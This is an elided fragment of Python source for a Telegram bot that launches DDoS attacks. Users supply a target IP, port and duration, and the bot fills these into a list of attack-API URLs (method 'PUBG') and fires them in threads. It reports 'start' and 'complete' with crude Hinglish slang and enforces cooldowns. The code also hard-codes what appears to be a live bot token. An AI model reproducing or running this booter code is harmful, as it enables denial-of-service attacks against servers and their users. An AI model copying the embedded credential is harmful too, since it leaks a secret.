...
BOT_TOKEN = os.getenv("BOT_TOKEN", "8906376964:AAGWD4ECPbsJFlhW0QCghKcKUyHdMWKHqPM")
MONGO_URL = os.getenv("MONGO_URL", "mongodbPme=DDoS")
...
API_LIST = [
"http://9.108.0/attack=&host={ip}&port={port}&time={time}&method=PUBG&concs=1",
"http://9.108.0/attack=&host={ip}&port={port}&time={time}&method=PUBG&concs=1",
"http://9.108.0/attack=&host={ip}&port={port}&time={time}&method=PUBG&concs=1",
"http://9.108.0/attack=&host={ip}&port={port}&time={time}&method=PUBG&concs=1",
...
def start_attack(target, port, duration, message, attack_id, api_index):
    try:
        ...
        bot.reply_to(message, f"⚡ Chudai Start!\n\n🎯 Target: {target}:{port}\n⏱️ Time: {duration}s\n⏳ Cooldown after attack: {get_user_cooldown_setting()}s\n\n📊 /status se check kro")
        
        # Build a fresh URL for this specific attack with the correct target IP
        api_url = API_LIST[api_index].format(ip=target, port=port, time=duration)
        
        # Call ONLY the assigned API slot once — in its own thread so it doesn't block
        try:
        ...
        if remaining_cooldown > 0:
            bot.reply_to(message, f"✅ Chudai Complete!\n\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s\n\n⏳ Cooldown left: {remaining_cooldown}s")
        else:
            bot.reply_to(message, f"✅ Chudai Complete!\n\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s")
